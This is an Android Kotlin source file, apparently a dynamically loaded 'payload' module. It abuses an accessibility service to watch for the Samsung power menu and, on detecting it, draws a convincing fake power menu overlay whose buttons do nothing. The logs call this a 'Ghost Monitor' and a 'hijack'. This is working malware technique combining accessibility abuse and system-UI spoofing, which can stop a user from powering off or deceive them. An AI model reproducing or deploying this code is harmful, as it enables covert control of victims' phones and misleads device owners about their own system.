package com.speedster.payload

import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.speedster.DynamicEntry
import java.io.File

class PayloadEntry : DynamicEntry {
    private var isOverlayShowing by mutableStateOf(false)

    override @Composable fun Render(context: Context, resDir: File) {
        // 1. Monitor the Tree for the Power Menu
        LaunchedEffect(Unit) {
            DynamicEntry.log("🕵️ Ghost Monitor Active: Waiting for Power Menu...")
            
            DynamicEntry.accessibilityInterceptor = { event ->
                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                root?.let {
                    val nodes = mutableListOf<String>()
                    findTextNodes(it, nodes)
                    it.recycle()

                    // Heuristic: If we see these three specific Samsung strings, trigger the hijack
                    if (nodes.contains("Power off") && nodes.contains("Restart")) {
                        if (!isOverlayShowing) {
                            DynamicEntry.log("🎯 Power Menu Detected! Injecting Overlay.")
                            isOverlayShowing = true
                        }
                    }
                }
            }

            // 2. Intercept Back/Home keys to dismiss
            DynamicEntry.keyInterceptor = { event ->
                if (isOverlayShowing && (event.keyCode == android.view.KeyEvent.KEYCODE_BACK || 
                    event.keyCode == android.view.KeyEvent.KEYCODE_HOME)) {
                    isOverlayShowing = false
                    DynamicEntry.overlayContent = null
                    false // Allow the system to handle the key to actually go back
                } else {
                    false
                }
            }
        }

        // 3. Update the Global Overlay Slot
        SideEffect {
            if (isOverlayShowing) {
                DynamicEntry.overlayContent = { FakePowerMenu() }
            } else {
                DynamicEntry.overlayContent = null
            }
        }

        // Just a status UI for the Shell screen
        Box(modifier = Modifier.fillMaxSize().background(Color.Black), contentAlignment = androidx.compose.ui.Alignment.Center) {
            Text("Ghost Overlay Status: ${if(isOverlayShowing) "ACTIVE" else "IDLE"}", color = if(isOverlayShowing) Color.Red else Color.Green)
        }
    }

    private fun findTextNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
        if (node == null) return
        node.text?.let { results.add(it.toString()) }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            findTextNodes(child, results)
            child?.recycle()
        }
    }

    @Composable
    fun FakePowerMenu() {
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black.copy(alpha = 0.85f)),
            contentAlignment = androidx.compose.ui.Alignment.Center
        ) {
            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
                Row { 
                    PowerButton(name = "Power off", color = Color(0xFF424242), icon = "⏻") 
                    Spacer(Modifier.width(40.dp))
                    PowerButton(name = "Restart", color = Color(0xFF2E7D32), icon = "↺") 
                }
                Spacer(Modifier.height(40.dp))
                Row { 
                    PowerButton(name = "Emergency\nmode", color = Color(0xFFC62828), icon = "⚠") 
                    Spacer(Modifier.width(40.dp))
                    PowerButton(name = "Lockdown\nmode", color = Color(0xFF00897B), icon = "🔒") 
                }
                Spacer(Modifier.height(100.dp))
                androidx.compose.material3.Button(
                    onClick = { },
                    colors = androidx.compose.material3.ButtonDefaults.buttonColors(containerColor = Color(0xFF333333))
                ) {
                    Text("Side key settings", color = Color.White)
                }
            }
        }
    }

    @Composable
    fun PowerButton(name: String, color: Color, icon: String) {
        Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
            Box(
                modifier = Modifier
                    .size(80.dp)
                    .background(color, androidx.compose.foundation.shape.CircleShape),
                contentAlignment = androidx.compose.ui.Alignment.Center
            ) {
                Text(icon, color = Color.White, fontSize = 30.sp)
            }
            Spacer(Modifier.height(8.dp))
            Text(name, color = Color.White, fontSize = 14.sp, textAlign = androidx.compose.ui.text.style.TextAlign.Center)
        }
    }
}